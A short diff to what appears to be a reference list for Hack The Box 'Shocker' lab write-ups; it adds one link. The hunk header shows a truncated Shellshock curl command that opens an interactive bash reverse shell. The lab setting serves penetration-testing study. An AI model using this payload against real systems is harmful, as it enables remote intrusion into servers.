@@ -67,3 +67,4 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 + https://www.linkedin.com/pulse/hack-box-htb-shocker-walkthrough-abdulhakim-öner
 + https://medium.com/@orhan_yildirim/shocker-hackthebox-write-up-538631df688f
 + https://brcyrr.medium.com/hack-the-box-shocker-602ea7452797
++ https://medium.com/@ismailplt3458/hack-the-box-shocker-machine-oscp-like-solution-aafc898adc65
